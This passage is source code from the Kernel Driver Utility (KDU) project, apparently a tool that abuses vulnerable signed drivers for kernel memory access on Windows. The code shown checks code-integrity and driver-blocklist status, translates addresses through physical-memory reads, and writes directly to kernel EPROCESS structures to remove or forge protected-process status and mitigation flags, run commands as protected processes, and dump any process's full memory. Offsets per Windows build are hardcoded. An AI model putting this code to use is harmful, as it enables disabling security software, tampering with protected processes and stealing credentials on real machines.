        SYSTEM_CODEINTEGRITY_INFORMATION ciPolicy;
        ULONG dummy = 0;
        BOOL hvciActive = FALSE; 

        ciPolicy.Length = sizeof(ciPolicy);
        ciPolicy.CodeIntegrityOptions = 0;
        if (NT_SUCCESS(NtQuerySystemInformation(
            SystemCodeIntegrityInformation,
            &ciPolicy,
            sizeof(ciPolicy),
            &dummy)))
        {
            if (ciPolicy.CodeIntegrityOptions & CODEINTEGRITY_OPTION_TESTSIGN)
                printf_s("[*] Test Mode ENABLED\r\n");

            if (ciPolicy.CodeIntegrityOptions & CODEINTEGRITY_OPTION_DEBUGMODE_ENABLED)
                printf_s("[*] Debug Mode ENABLED\r\n");

            if (ciPolicy.CodeIntegrityOptions & CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED) {
                hvciActive = TRUE;
                printf_s("[*] HVCI KMCI ENABLED\r\n");
            }

            if (ciPolicy.CodeIntegrityOptions & CODEINTEGRITY_OPTION_WHQL_ENFORCEMENT_ENABLED)
                printf_s("[*] WHQL enforcement ENABLED\r\n");

        }

        if (osv.dwBuildNumber >= NT_WIN10_REDSTONE5) {
            BOOL bEnabled = FALSE;
            if (supDetectMsftBlockList(&bEnabled, FALSE, osv.dwBuildNumber, hvciActive)) {
                printf_s("[+] MSFT Driver block list is %sbled\r\n", (bEnabled) ? "ena" : "disa");
            }
        }

        iResult = KDUProcessCommandLine(hvciEnabled, osv.dwBuildNumber);

    } while (FALSE);

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return iResult;
}

/*
* KDUIntroBanner
*
* Purpose:
*
* Display general KDU version info.
*
*/
VOID KDUIntroBanner()
{
    IMAGE_NT_HEADERS* ntHeaders = RtlImageNtHeader(NtCurrentPeb()->ImageBaseAddress);

    printf_s("[#] Kernel Driver Utility v%lu.%lu.%lu (build %lu) started, (c)2020 - %lu KDU Project\r\n"\
        "[#] Built at %s, header checksum 0x%lX\r\n"\
        "[#] Supported x64 OS : Windows 7 and above\r\n",
        KDU_VERSION_MAJOR,
        KDU_VERSION_MINOR,
        KDU_VERSION_REVISION,
        KDU_VERSION_BUILD,
        KDU_COPYRIGHT_YEAR,
        __TIMESTAMP__,
        ntHeaders->OptionalHeader.CheckSum);
}

/*
* KDUCheckAnotherInstance
*
* Purpose:
*
* Check if there is another instance running.
*
*/
UINT KDUCheckAnotherInstance()
{
    HANDLE mutantHandle;
    WCHAR szObject[MAX_PATH + 1];
    WCHAR szName[128];

    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING usName;

    RtlSecureZeroMemory(szName, sizeof(szName));
    RtlSecureZeroMemory(szObject, sizeof(szObject));

    supGenerateSharedObjectName(KDU_SYNC_MUTANT, (LPWSTR)&szName);

    StringCchPrintf(szObject,
        MAX_PATH,
        L"\\BaseNamedObjects\\%ws",
        szName);

    RtlInitUnicodeString(&usName, szObject);
    InitializeObjectAttributes(&obja, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    NTSTATUS status = NtCreateMutant(&mutantHandle, MUTANT_ALL_ACCESS, &obja, FALSE);

    if (status == STATUS_OBJECT_NAME_COLLISION) {
        return ERROR_ALREADY_EXISTS;
    }

    return 0;
}

/*
* main
*
* Purpose:
*
* Program entry point.
*
*/
int main()
{
    HeapSetInformation(NULL, HeapEnableTerminationOnCorruption, NULL, 0);
    KDUIntroBanner();

    int retVal = KDUCheckAnotherInstance();

    if (retVal != ERROR_ALREADY_EXISTS) {

        __try {
            retVal = KDUMain();
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            printf_s("[!] Unhandled exception 0x%lx\r\n", GetExceptionCode());
            return -1;
        }

    }
    else {
        supPrintfEvent(kduEventError,
            "[!] Another instance is running, close it before\r\n");
    }

    printf_s("[+] Return value: %d. Bye-bye!\r\n", retVal);
    return retVal;
}

```

`Source/Hamakaze/pagewalk.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2021
*
*  TITLE:       PAGEWALK.CPP
*
*  VERSION:     1.12
*
*  DATE:        16 May 2021
*
*  Function to translate virtual to physical addresses, x86-64.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

#define PHY_ADDRESS_MASK                0x000ffffffffff000ull
#define PHY_ADDRESS_MASK_1GB_PAGES      0x000fffffc0000000ull
#define PHY_ADDRESS_MASK_2MB_PAGES      0x000fffffffe00000ull
#define VADDR_ADDRESS_MASK_1GB_PAGES    0x000000003fffffffull
#define VADDR_ADDRESS_MASK_2MB_PAGES    0x00000000001fffffull
#define VADDR_ADDRESS_MASK_4KB_PAGES    0x0000000000000fffull
#define ENTRY_PRESENT_BIT               1
#define ENTRY_PAGE_SIZE_BIT             0x0000000000000080ull

int PwEntryToPhyAddr(ULONG_PTR entry, ULONG_PTR* phyaddr)
{
    if (entry & ENTRY_PRESENT_BIT) {
        *phyaddr = entry & PHY_ADDRESS_MASK;
        return 1;
    }

    return 0;
}

BOOL PwVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ provQueryPML4 QueryPML4Routine,
    _In_ provReadPhysicalMemory ReadPhysicalMemoryRoutine,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    ULONG_PTR   pml4_cr3, selector, table, entry = 0;
    INT         r, shift;

    *PhysicalAddress = 0;

    if (QueryPML4Routine(DeviceHandle, &pml4_cr3) == 0) {
        SetLastError(ERROR_DEVICE_HARDWARE_ERROR);
        return 0;
    }

    table = pml4_cr3 & PHY_ADDRESS_MASK;

    for (r = 0; r < 4; r++) {

        shift = 39 - (r * 9);
        selector = (VirtualAddress >> shift) & 0x1ff;

        if (ReadPhysicalMemoryRoutine(DeviceHandle,
            table + selector * 8,
            &entry,
            sizeof(ULONG_PTR)) == 0)
        {
            //
            // Last error set by called routine.
            //
            return 0;
        }

        if (PwEntryToPhyAddr(entry, &table) == 0) {
            SetLastError(ERROR_INVALID_ADDRESS);
            return 0;
        }

        if (entry & ENTRY_PAGE_SIZE_BIT)
        {
            if (r == 1) {
                table &= PHY_ADDRESS_MASK_1GB_PAGES;
                table += VirtualAddress & VADDR_ADDRESS_MASK_1GB_PAGES;
                *PhysicalAddress = table;
                return 1;
            }

            if (r == 2) {
                table &= PHY_ADDRESS_MASK_2MB_PAGES;
                table += VirtualAddress & VADDR_ADDRESS_MASK_2MB_PAGES;
                *PhysicalAddress = table;
                return 1;
            }
        }
    }

    table += VirtualAddress & VADDR_ADDRESS_MASK_4KB_PAGES;
    *PhysicalAddress = table;

    return 1;
}

```

`Source/Hamakaze/pagewalk.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2020
*
*  TITLE:       PAGEWALK.H
*
*  VERSION:     1.00
*
*  DATE:        07 Feb 2020
*
*  Page table translation prototypes.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

BOOL PwVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ provQueryPML4 QueryPML4Routine,
    _In_ provReadPhysicalMemory ReadPhysicalMemoryRoutine,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

```

`Source/Hamakaze/ps.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2026
*
*  TITLE:       PS.CPP
*
*  VERSION:     1.46
*
*  DATE:        12 Feb 2026
*
*  Processes DKOM related routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include <Dbghelp.h>

typedef BOOL(WINAPI* pfnMiniDumpWriteDump)(
    _In_ HANDLE hProcess,
    _In_ DWORD ProcessId,
    _In_ HANDLE hFile,
    _In_ MINIDUMP_TYPE DumpType,
    _In_opt_ PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    _In_opt_ PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    _In_opt_ PMINIDUMP_CALLBACK_INFORMATION CallbackParam);

LPCSTR KDUGetProtectionTypeAsString(
    _In_ ULONG Type
)
{
    LPCSTR typeStrings[] = {
        "PsProtectedTypeNone",
        "PsProtectedTypeProtectedLight",
        "PsProtectedTypeProtected"
    };

    return (Type <= PsProtectedTypeProtected) ? typeStrings[Type] : "Unknown Type";
}

LPCSTR KDUGetProtectionSignerAsString(
    _In_ ULONG Signer
)
{
    static LPCSTR signerStrings[] = {
        "PsProtectedSignerNone",
        "PsProtectedSignerAuthenticode",
        "PsProtectedSignerCodeGen",
        "PsProtectedSignerAntimalware",
        "PsProtectedSignerLsa",
        "PsProtectedSignerWindows",
        "PsProtectedSignerWinTcb",
        "PsProtectedSignerWinSystem",
        "PsProtectedSignerApp"
    };

    return (Signer <= PsProtectedSignerApp) ? signerStrings[Signer] : "Unknown Value";
}

/*
* KDUDumpProcessMemory
*
* Purpose:
*
* Dump process memory.
*
*/
BOOL KDUDumpProcessMemory(
    _In_ PKDU_CONTEXT Context,
    _In_ HANDLE ProcessId
)
{
    BOOL bResult = FALSE;
    HMODULE dbgModule = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    HANDLE processHandle = NULL;
    pfnMiniDumpWriteDump pMiniDumpWriteDump;

    WCHAR szOutputName[MAX_PATH];
    PSYSTEM_PROCESS_INFORMATION procEntry = NULL;
    PVOID procBuffer = supGetSystemInfo(SystemProcessInformation);

    if (!procBuffer) {
        supPrintfEvent(kduEventError, "Cannot allocate process list\r\n");
        return FALSE;
    }

    do {
        if (!ntsupQueryProcessEntryById(ProcessId, (PBYTE)procBuffer, &procEntry)) {
            supPrintfEvent(kduEventError,
                "The %lX process doesn't exist in process list\r\n",
                HandleToUlong(ProcessId));
            break;
        }

        supPrintfEvent(kduEventInformation, "[+] Dumping memory of the process 0x%lX (%wZ)\r\n",
            HandleToUlong(ProcessId), procEntry->ImageName);

        dbgModule = LoadLibraryEx(L"dbghelp.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
        if (dbgModule == NULL) {
            supShowWin32Error("[!] Cannot load dbghelp.dll", GetLastError());
            break;
        }

        pMiniDumpWriteDump = (pfnMiniDumpWriteDump)GetProcAddress(dbgModule, "MiniDumpWriteDump");
        if (pMiniDumpWriteDump == NULL) {
            supShowWin32Error("[!] Dump function is not found", GetLastError());
            break;
        }

        bResult = KDUOpenProcess(Context, ProcessId, PROCESS_ALL_ACCESS, &processHandle);
        if (!bResult || processHandle == NULL) {
            supShowWin32Error("[!] Cannot open process", GetLastError());
            break;
        }

        StringCchPrintf(szOutputName,
            RTL_NUMBER_OF(szOutputName),
            TEXT("vmem_pid_%lX.dmp"),
            HandleToUlong(ProcessId));

        hFile = CreateFile(szOutputName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            supShowWin32Error("[!] Cannot write memory dump", GetLastError());
            break;
        }

        bResult = pMiniDumpWriteDump(processHandle,
            0,
            hFile,
            MiniDumpWithFullMemory,
            NULL,
            NULL,
            NULL);

        if (bResult) {
            supPrintfEvent(kduEventInformation, "[+] Process memory dumped to %ws\r\n", szOutputName);
        }
        else {
            supShowWin32Error("[!] Cannot dump process", GetLastError());
        }

    } while (FALSE);

    supHeapFree(procBuffer);
    if (processHandle) NtClose(processHandle);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (dbgModule) FreeLibrary(dbgModule);

    return bResult;
}

/*
* KDURunCommandPPL
*
* Purpose:
*
* Start a Process as PPL-Antimalware
*
*/
BOOL KDURunCommandPPL(
    _In_ PKDU_CONTEXT Context,
    _In_ LPWSTR CommandLine,
    _In_ BOOL HighestSigner)
{
    DWORD dwThreadResumeCount = 0;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    RtlZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    RtlZeroMemory(&pi, sizeof(pi));

    wprintf_s(L"[+] Creating Process '%s'\r\n", CommandLine);

    if (!CreateProcess(
        NULL,               // No module name (use command line)
        CommandLine,        // Command line
        NULL,               // Process handle not inheritable
        NULL,               // Thread handle not inheritable
        FALSE,              // Set handle inheritance to FALSE
        CREATE_SUSPENDED,   // Create Process suspended so we can edit
        // its protection level prior to starting
        NULL,               // Use parent's environment block
        NULL,               // Use parent's starting directory 
        &si,                // Pointer to STARTUPINFO structure
        &pi))
    {
        supShowWin32Error("[!] Failed to create process", GetLastError());
        return FALSE;
    }

    printf_s("[+] Created Process with PID %lu\r\n", pi.dwProcessId);

    PS_PROTECTED_SIGNER signer;
    PS_PROTECTED_TYPE type;
    if (HighestSigner) { // the highest observed protection is WinTcb(6)/ProtectedLight(1)
        signer = PsProtectedSignerWinTcb;
        type = PsProtectedTypeProtectedLight;
    }
    else {
        signer = PsProtectedSignerAntimalware;
        type = PsProtectedTypeProtectedLight;
    }

    if (!KDUControlProcessProtections(Context, pi.dwProcessId, signer, type)) {
        supShowWin32Error("[!] Failed to set process as PPL", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    dwThreadResumeCount = ResumeThread(pi.hThread);
    if (dwThreadResumeCount != 1) {
        printf_s("[!] Failed to resume process: %lu | 0x%lX\n", dwThreadResumeCount, GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles.
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
}

/*
* KDUUnprotectProcess
*
* Purpose:
*
* Modify process object to remove PsProtectedProcess access restrictions.
*
*/
BOOL KDUUnprotectProcess(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId)
{
    return KDUControlProcessProtections(Context, ProcessId, PsProtectedSignerNone, PsProtectedTypeNone);
}

/*
* KDUUnmitigateProcess
*
* Purpose:
*
* Modify process object to remove process mitigations.
*
*/
BOOL KDUUnmitigateProcess(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId,
    _In_ ULONG PsNewMitigations,
    _In_ INT TargetedFlags)
{
    return KDUControlProcessMitigationFlags(Context, ProcessId, PsNewMitigations, TargetedFlags);
}

/*
* printProtection
*
* Purpose:
*
* Print process protection with string descriptions.
*
*/
VOID printProtection(
    _In_ ULONG Buffer
)
{
    PS_PROTECTION* PsProtection = (PS_PROTECTION*)&Buffer;

    printf_s("\tPsProtection->Type: %lu (%s)\r\n",
        PsProtection->Type,
        KDUGetProtectionTypeAsString(PsProtection->Type));

    printf_s("\tPsProtection->Signer: %lu (%s)\r\n",
        PsProtection->Signer,
        KDUGetProtectionSignerAsString(PsProtection->Signer));

    printf_s("\tPsProtection->Audit: %lu\r\n", PsProtection->Audit);
}

/*
* printMitigationFlags
*
* Purpose:
*
* Print ProcessMitigationsFlags2 value.
*
*/
VOID printMitigationFlags(
    _In_ INT Index,
    _In_ ULONG Buffer
)
{
    // PS_MITIGATION* PsMitigation = (PS_MITIGATION*)&Buffer; // TODO parse?
    printf_s("\tPsMitigationFlags%i: 0x%lX\r\n", Index, Buffer);
}

/*
* KDUGetEprocessOffsets
*
* Purpose:
*
* Get all EPROCESS offsets (PsProtection, MitigationFlags1, MitigationFlags2)
* for specific Windows version.
*
*/
BOOL KDUGetEprocessOffsets(
    _In_ ULONG NtBuildNumber,
    _Out_ PKDU_EPROCESS_OFFSETS Offsets
)
{
    Offsets->PsProtectionOffset = 0;
    Offsets->MitigationFlags1Offset = 0;
    Offsets->MitigationFlags2Offset = 0;

    switch (NtBuildNumber) {

    case NT_WIN8_BLUE:
        Offsets->PsProtectionOffset = PsProtectionOffset_9600;
        break;

    case NT_WIN10_THRESHOLD1:
        Offsets->PsProtectionOffset = PsProtectionOffset_10240;
        break;

    case NT_WIN10_THRESHOLD2:
        Offsets->PsProtectionOffset = PsProtectionOffset_10586;
        break;

    case NT_WIN10_REDSTONE1:
        Offsets->PsProtectionOffset = PsProtectionOffset_14393;
        break;

    case NT_WIN10_REDSTONE2:
        Offsets->PsProtectionOffset = PsProtectionOffset_15063;
        break;

    case NT_WIN10_REDSTONE3:
    case NT_WIN10_REDSTONE4:
        Offsets->PsProtectionOffset = PsProtectionOffset_15063;
        Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_RS3;
        Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_RS3;
        break;

    case NT_WIN10_REDSTONE5:
        Offsets->PsProtectionOffset = PsProtectionOffset_15063;
        Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_RS5;
        Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_RS5;
        break;

    case NT_WIN10_19H1:
    case NT_WIN10_19H2:
        Offsets->PsProtectionOffset = PsProtectionOffset_15063;
        Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_18362;
        Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_18362;
        break;

    case NT_WIN10_20H1:
    case NT_WIN10_20H2:
    case NT_WIN10_21H1:
    case NT_WIN10_21H2:
    case NT_WIN10_22H2:
    case NT_WINSRV_21H1:
    case NT_WIN11_21H2:
    case NT_WIN11_22H2:
    case NT_WIN11_23H2:
        Offsets->PsProtectionOffset = PsProtectionOffset_19041;
        Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_19041;
        Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_19041;
        break;

    case NT_WIN11_24H2:
    case NT_WIN11_25H2:
        Offsets->PsProtectionOffset = PsProtectionOffset_26100;
        Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_26100;
        Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_26100;
        break;

    default:
        return FALSE;
    }

    return TRUE;
}

BOOL KDUVerifyProviderCallbacksForPsPatch(
    _In_ PKDU_CONTEXT Context
)
{
    if (Context->Provider->Callbacks.ReadKernelVM == NULL ||
        Context->Provider->Callbacks.WriteKernelVM == NULL)
    {
        return FALSE;
    }

    return TRUE;
}

/*
* KDUControlProcessProtections
*
* Purpose:
*
* Modify process object to remove PsProtectedProcess access restrictions.
*
*/
BOOL KDUControlProcessProtections(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId,
    _In_ PS_PROTECTED_SIGNER PsProtectionSigner,
    _In_ PS_PROTECTED_TYPE PsProtectionType)
{
    BOOL       bResult = FALSE;
    ULONG      Buffer;
    NTSTATUS   ntStatus;
    ULONG_PTR  ProcessObject = 0, VirtualAddress = 0;
    HANDLE     hProcess = NULL;

    KDU_EPROCESS_OFFSETS offsets;
    CLIENT_ID clientId;
    OBJECT_ATTRIBUTES obja;

    if (!KDUVerifyProviderCallbacksForPsPatch(Context))
        return FALSE;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    InitializeObjectAttributes(&obja, NULL, 0, 0, 0);

    clientId.UniqueProcess = (HANDLE)ProcessId;
    clientId.UniqueThread = NULL;

    ntStatus = NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION,
        &obja, &clientId);

    if (NT_SUCCESS(ntStatus)) {

        printf_s("[+] Process with PID %llu opened (PROCESS_QUERY_LIMITED_INFORMATION)\r\n", ProcessId);
        bResult = supQueryObjectFromHandle(hProcess, &ProcessObject);

        if (bResult && (ProcessObject != 0)) {

            printf_s("[+] Process object (EPROCESS) found, 0x%llX\r\n", ProcessObject);

            if (!KDUGetEprocessOffsets(Context->NtBuildNumber, &offsets) ||
                offsets.PsProtectionOffset == 0)
            {
                supPrintfEvent(kduEventError,
                    "[!] Unsupported WinNT version\r\n");

            }
            else {

                VirtualAddress = EPROCESS_TO_PROTECTION(ProcessObject, offsets.PsProtectionOffset);

                printf_s("[+] EPROCESS->PS_PROTECTION, 0x%llX\r\n", VirtualAddress);

                Buffer = 0;

                if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                    VirtualAddress,
                    &Buffer,
                    sizeof(ULONG)))
                {
                    printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress);
                    printProtection(Buffer);

                    Buffer = (Buffer & 0xFFFFFF00) | ((PsProtectionSigner << 4) | (PsProtectionType & 0x7));

                    bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
                        VirtualAddress,
                        &Buffer,
                        sizeof(UCHAR));

                    if (bResult) {
                        printf_s("[+] Process object modified\r\n");

                        ULONG verifyBuf = 0;
                        if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                            VirtualAddress,
                            &verifyBuf,
                            sizeof(UCHAR)))
                        {
                            printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress);
                            printf_s("\tNew PsProtection: 0x%02X\n", verifyBuf & 0xff);
                            printProtection(verifyBuf);
                        }
                    }
                    else {

                        supPrintfEvent(kduEventError,
                            "[!] Cannot modify process object\r\n");

                    }
                }
                else {

                    supPrintfEvent(kduEventError,
                        "[!] Cannot read kernel memory\r\n");

                }
            }
        }
        else {
            supPrintfEvent(kduEventError,
                "[!] Cannot query process object\r\n");
        }
        NtClose(hProcess);
    }
    else {
        supShowHardError("[!] Cannot open target process", ntStatus);
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bResult;
}

/*
* KDUControlProcessMitigationFlags
*
* Purpose:
*
* Modify process object to remove process MitigationFlags.
*
*/
BOOL KDUControlProcessMitigationFlags(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId,
    _In_ ULONG PsNewMitigations,
    _In_ INT TargetedFlags)
{
    BOOL       bResult1 = TRUE;
    BOOL       bResult2 = TRUE;
    ULONG      Buffer1, Buffer2;
    NTSTATUS   ntStatus;
    ULONG_PTR  ProcessObject = 0, VirtualAddress1 = 0, VirtualAddress2 = 0;
    HANDLE     hProcess = NULL;

    KDU_EPROCESS_OFFSETS offsets;
    CLIENT_ID clientId;
    OBJECT_ATTRIBUTES obja;

    if (!KDUVerifyProviderCallbacksForPsPatch(Context))
        return FALSE;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    InitializeObjectAttributes(&obja, NULL, 0, 0, 0);

    clientId.UniqueProcess = (HANDLE)ProcessId;
    clientId.UniqueThread = NULL;

    ntStatus = NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION,
        &obja, &clientId);

    if (NT_SUCCESS(ntStatus)) {

        printf_s("[+] Process with PID %llu opened (PROCESS_QUERY_LIMITED_INFORMATION)\r\n", ProcessId);
        bResult1 = supQueryObjectFromHandle(hProcess, &ProcessObject);

        if (bResult1 && (ProcessObject != 0)) {

            printf_s("[+] Process object (EPROCESS) found, 0x%llX\r\n", ProcessObject);

            if (!KDUGetEprocessOffsets(Context->NtBuildNumber, &offsets) ||
                offsets.MitigationFlags1Offset == 0 ||
                offsets.MitigationFlags2Offset == 0)
            {

                supPrintfEvent(kduEventError,
                    "[!] Unsupported WinNT version\r\n");

            }
            else {

                VirtualAddress1 = EPROCESS_TO_MITIGATIONFLAGS(ProcessObject, offsets.MitigationFlags1Offset);
                VirtualAddress2 = EPROCESS_TO_MITIGATIONFLAGS(ProcessObject, offsets.MitigationFlags2Offset);

                printf_s("[+] EPROCESS->PS_MITIGATION_FLAGS1, 0x%llX\r\n", VirtualAddress1);
                printf_s("[+] EPROCESS->PS_MITIGATION_FLAGS2, 0x%llX\r\n", VirtualAddress2);

                Buffer1 = Buffer2 = 0;

                bResult1 = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                    VirtualAddress1,
                    &Buffer1,
                    sizeof(ULONG));

                bResult2 = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                    VirtualAddress2,
                    &Buffer2,
                    sizeof(ULONG));

                if (bResult1 && bResult2)
                {
                    printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress1);
                    printMitigationFlags(1, Buffer1);
                    printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress2);
                    printMitigationFlags(2, Buffer2);

                    Buffer1 = Buffer2 = PsNewMitigations;

                    if (TargetedFlags & PS_MITIGATION_FLAGS1) {
                        printf_s("[+] Overwriting MitigationFlags1\r\n");
                        bResult1 = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
                            VirtualAddress1,
                            &Buffer1,
                            sizeof(ULONG));
                    }

                    if (TargetedFlags & PS_MITIGATION_FLAGS2) {
                        printf_s("[+] Overwriting MitigationFlags2\r\n");
                        bResult2 = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
                            VirtualAddress2,
                            &Buffer2,
                            sizeof(ULONG));
                    }

                    if (bResult1 && bResult2) {
                        printf_s("[+] Process object(s) modified\r\n");

                        ULONG verifyBuf1 = 0xDEADBEEF; // if DEADBEEF is in output, read failed, this is a sanity check
                        if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                            VirtualAddress1,
                            &verifyBuf1,
                            sizeof(ULONG)))
                        {
                            printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress1);
                            printMitigationFlags(1, verifyBuf1);
                        }

                        ULONG verifyBuf2 = 0xDEADBEEF;
                        if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                            VirtualAddress2,
                            &verifyBuf2,
                            sizeof(ULONG)))
                        {
                            printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress2);
                            printMitigationFlags(2, verifyBuf2);
                        }

                    }
                    else {

                        supPrintfEvent(kduEventError,
                            "[!] Cannot modify process object\r\n");

                    }
                }
                else {

                    supPrintfEvent(kduEventError,
                        "[!] Cannot read kernel memory\r\n");

                }
            }
        }
        else {
            supPrintfEvent(kduEventError,
                "[!] Cannot query process object\r\n");
        }
        NtClose(hProcess);
    }
    else {
        supShowHardError("[!] Cannot open target process", ntStatus);
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bResult1 && bResult2;
}

```

`Source/Hamakaze/ps.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2026
*
*  TITLE:       PS.H
*
*  VERSION:     1.46
*
*  DATE:        12 Feb 2026
*
*  Processes support prototypes and definitions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#define PsProtectionOffset_9600  0x67A
#define PsProtectionOffset_10240 0x6AA
#define PsProtectionOffset_10586 0x6B2
#define PsProtectionOffset_14393 0x6C2
#define PsProtectionOffset_15063 0x6CA //same for 16299, 17134, 17763
#define PsProtectionOffset_18362 0x6FA
#define PsProtectionOffset_18363 0x6FA
#define PsProtectionOffset_19041 0x87A //same for 19042..19045
#define PsProtectionOffset_26100 0x5FA //same for 26100..26200 (24H2, 25H2)

//RS3..RS4
#define PsMitigationFlags1Offset_RS3    0x828
#define PsMitigationFlags2Offset_RS3    0x82c

#define PsMitigationFlags1Offset_RS5    0x820
#define PsMitigationFlags2Offset_RS5    0x824

// 1903..1909
#define PsMitigationFlags1Offset_18362  0x850
#define PsMitigationFlags2Offset_18362  0x854

// 2004..23H2
#define PsMitigationFlags1Offset_19041  0x9d0
#define PsMitigationFlags2Offset_19041  0x9d4

//24H2..25H2
#define PsMitigationFlags1Offset_26100 0x750
#define PsMitigationFlags2Offset_26100 0x754

#define PS_NO_MITIGATIONS    0x00000000
#define PS_MITIGATION_FLAGS1 0x00000001
#define PS_MITIGATION_FLAGS2 0x00000002

#define EPROCESS_TO_PROTECTION(Object, Offset) ((ULONG_PTR)(Object) + (Offset))
#define EPROCESS_TO_MITIGATIONFLAGS(Object, FlagsOffset) ((ULONG_PTR)(Object) + (FlagsOffset))

typedef struct _KDU_EPROCESS_OFFSETS {
    ULONG_PTR PsProtectionOffset;
    ULONG_PTR MitigationFlags1Offset;
    ULONG_PTR MitigationFlags2Offset;
} KDU_EPROCESS_OFFSETS, * PKDU_EPROCESS_OFFSETS;

BOOL KDUGetEprocessOffsets(
    _In_ ULONG NtBuildNumber,
    _Out_ PKDU_EPROCESS_OFFSETS Offsets);

BOOL KDUUnprotectProcess(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId);

BOOL KDUUnmitigateProcess(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId,
    _In_ ULONG PsNewMitigation,
    _In_ INT TargetedFlags);

BOOL KDURunCommandPPL(
    _In_ PKDU_CONTEXT Context,
    _In_ LPWSTR CommandLine,
    _In_ BOOL HighestSigner);

BOOL KDUDumpProcessMemory(
    _In_ PKDU_CONTEXT Context,
    _In_ HANDLE ProcessId);

BOOL KDUControlProcessProtections(
    _In_ PKDU_CONTEXT Context,
